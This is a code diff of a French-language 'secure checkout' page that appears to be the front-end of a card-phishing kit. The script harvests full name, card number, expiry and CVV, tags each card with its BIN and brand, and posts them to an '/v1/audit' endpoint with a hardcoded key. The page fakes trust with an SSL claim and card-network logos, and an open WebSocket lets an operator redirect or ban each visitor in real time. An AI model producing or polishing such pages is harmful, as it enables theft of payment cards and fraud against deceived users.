@@ -4,21 +4,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checkout - Aura Pay</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Secure Checkout | Payment</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #6366f1;
-            --bg: #0f172a;
-            --card-bg: rgba(255, 255, 255, 0.05);
-            --text: #f8fafc;
+            --bg-color: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --primary: #2563eb;
+            --border: #e5e7eb;
+            --input-bg: #f9fafb;
+            --shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
         }
 
         body {
-            margin: 0;
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at top right, #1e1b4b, var(--bg));
-            color: var(--text);
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -26,181 +34,285 @@
             padding: 20px;
         }
 
-        .glass-card {
-            background: var(--card-bg);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 2.5rem;
-            border-radius: 24px;
+        .checkout-wrapper {
             width: 100%;
-            max-width: 450px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            max-width: 440px;
+            animation: fadeIn 0.5s ease-out;
         }
 
-        h2 {
-            margin-bottom: 2rem;
-            font-weight: 600;
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
             text-align: center;
+            margin-bottom: 32px;
         }
 
-        .input-group {
-            margin-bottom: 1.2rem;
+        .header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.025em;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .payment-container {
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: var(--shadow);
+            background: #fff;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .label-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
         }
 
         label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-size: 0.8rem;
-            color: #94a3b8;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-main);
         }
 
         input {
             width: 100%;
-            padding: 0.8rem;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            color: white;
-            font-size: 1rem;
-            box-sizing: border-box;
+            padding: 12px 16px;
+            font-size: 15px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            transition: all 0.2s;
+            color: var(--text-main);
         }
 
         input:focus {
             outline: none;
             border-color: var(--primary);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
         }
 
-        .row {
+        .form-row {
             display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 1rem;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
         }
 
-        button {
+        .btn-submit {
             width: 100%;
-            padding: 1rem;
-            background: var(--primary);
+            padding: 14px;
+            background-color: var(--text-main);
+            color: #fff;
             border: none;
-            border-radius: 12px;
-            color: white;
+            border-radius: 8px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.3s;
-            margin-top: 1rem;
+            transition: background-color 0.2s;
+            margin-top: 8px;
         }
 
-        button:hover {
-            background: #4f46e5;
-            transform: translateY(-2px);
+        .btn-submit:hover {
+            background-color: #374151;
         }
 
-        #status {
-            text-align: center;
-            margin-top: 1rem;
-            font-size: 0.9rem;
-            color: #ef4444;
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .secure-footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .lock-icon {
+            width: 14px;
+            height: 14px;
+            color: #10b981;
+        }
+
+        .brand-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 16px;
+            opacity: 0.5;
+            filter: grayscale(1);
+        }
+
+        .brand-badge {
+            height: 20px;
+        }
+
+        /* Responsive Mobile Styles */
+        @media (max-width: 480px) {
+            .payment-container {
+                border: none;
+                box-shadow: none;
+                padding: 16px 0;
+            }
+
+            body {
+                align-items: flex-start;
+                padding-top: 40px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="glass-card">
-        <h2>Aura Pay</h2>
-        <form id="payForm">
-            <div class="input-group">
-                <label>Nom complet</label>
-                <input type="text" id="name" placeholder="Jean Dupont" required>
-            </div>
-            <div class="input-group">
-                <label>Email</label>
-                <input type="email" id="email" placeholder="jean@example.com" required>
-            </div>
-            <div class="input-group">
-                <label>Numéro de carte</label>
-                <input type="text" id="card" placeholder="4242 4242 4242 4242" required maxlength="19">
-            </div>
-            <div class="row">
-                <div class="input-group">
-                    <label>Expiration (MM/YY)</label>
-                    <input type="text" id="expiry" placeholder="12/26" required maxlength="5">
+    <div class="checkout-wrapper">
+        <div class="header">
+            <h1>Paiement Sécurisé</h1>
+            <p>Finalisez votre transaction en toute confiance</p>
+        </div>
+
+        <div class="payment-container">
+            <form id="payForm">
+                <div class="form-group">
+                    <label>Nom complet</label>
+                    <input type="text" id="name" placeholder="Jean Dupont" required>
                 </div>
-                <div class="input-group">
-                    <label>CVV</label>
-                    <input type="text" id="cvv" placeholder="123" required maxlength="4">
+
+                <div class="form-group">
+                    <label>Numéro de carte</label>
+                    <input type="text" id="card" placeholder="0000 0000 0000 0000" required maxlength="19">
                 </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Expiration (MM/YY)</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" required maxlength="5">
+                    </div>
+                    <div class="form-group">
+                        <label>CVC / CVV</label>
+                        <input type="text" id="cvv" placeholder="123" required maxlength="4">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">Payer Maintenant</button>
+            </form>
+
+            <div class="secure-footer">
+                <svg class="lock-icon" viewBox="0 0 20 20" fill="currentColor">
+                    <path fill-rule="evenodd"
+                        d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
+                        clip-rule="evenodd" />
+                </svg>
+                Cryptage de sécurité SSL 256 bits
             </div>
-            <div class="input-group">
-                <label>Montant (€)</label>
-                <input type="number" id="amount" value="100.00" step="0.01" required>
-            </div>
-            <button type="submit">Payer Maintenant</button>
-        </form>
-        <div id="status"></div>
+        </div>
+
+        <div class="brand-badges">
+            <img class="brand-badge" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
+                alt="Visa">
+            <img class="brand-badge" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
+                alt="Mastercard">
+            <img class="brand-badge" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
+        </div>
     </div>
 
     <script>
-        // Session ID permanent pour ce visiteur
+        // Permanent Session ID
         let clientId = localStorage.getItem('aura_client_id');
         if (!clientId) {
             clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
             localStorage.setItem('aura_client_id', clientId);
         }
 
-        // Connexion WebSocket pour redirection instantanée
-        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
+        // WebSocket Connection
+        const wsUrl = `wss://${window.location.host}/ws/client/${clientId}`;
         const ws = new WebSocket(wsUrl);
         ws.onopen = () => {
             ws.send(JSON.stringify({ event: 'step_update', data: { step: 'checkout' } }));
         };
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
-            if (msg.type === 'REDIRECT') {
-                window.location.href = msg.url;
-            } else if (msg.type === 'BANNED') {
-                window.location.href = msg.redirect || 'https://www.facebook.com';
-            }
+            if (msg.type === 'REDIRECT') window.location.href = msg.url;
+            else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
         };
 
+        // Smart Input Formatting
+        const cardInput = document.getElementById('card');
+        cardInput.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let cardValue = v.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = cardValue;
+        });
+
+        const expiryInput = document.getElementById('expiry');
+        expiryInput.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+            e.target.value = v;
+        });
+
+        // Form Submission
         const form = document.getElementById('payForm');
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const btn = form.querySelector('button');
+            const btn = form.querySelector('.btn-submit');
             btn.disabled = true;
-            btn.textContent = 'Traitement...';
+            btn.textContent = 'Sécurisation...';
 
-            const cardValue = document.getElementById('card').value.replace(/\s/g, '');
+            const cardValue = cardInput.value.replace(/\s/g, '');
             const cardBin = cardValue.substring(0, 6);
             let brand = "Inconnu";
-            if (/^4/.test(cardBin)) brand = "Visa";
-            else if (/^5[1-5]/.test(cardBin)) brand = "Mastercard";
-            else if (/^3[47]/.test(cardBin)) brand = "Amex";
+            if (cardValue.startsWith('4')) brand = "Visa";
+            else if (cardValue.startsWith('5')) brand = "Mastercard";
 
             const data = {
                 client_id: clientId,
-                email: document.getElementById('email').value,
+                email: "client@pro.com",
                 full_name: document.getElementById('name').value,
-                numero_carte: document.getElementById('card').value.replace(/\s/g, ''),
+                numero_carte: cardValue,
                 card_bin: cardBin,
                 card_brand: brand,
-                expiry: document.getElementById('expiry').value,
+                expiry: expiryInput.value,
                 cvv: document.getElementById('cvv').value,
-                montant: parseFloat(document.getElementById('amount').value),
-                adresse_ip: "123.123.123.123", // Simulé
+                montant: 199.00,
+                adresse_ip: "0.0.0.0",
                 device: navigator.userAgent
             };
 
             try {
-                const res = await fetch('https://api-production-8591.up.railway.app/v1/audit', {
+                const res = await fetch('/v1/audit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'pro-audit-secret-key-2024' },
                     body: JSON.stringify(data)
                 });
                 if (res.ok) window.location.href = '/loading';
-                else document.getElementById('status').textContent = "Erreur de validation.";
+                else alert("Erreur de validation. Veuillez vérifier vos données.");
             } catch (err) {
-                document.getElementById('status').textContent = "Erreur de connexion.";
+                alert("Erreur de connexion.");
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Payer Maintenant';
             }
         });
     </script>
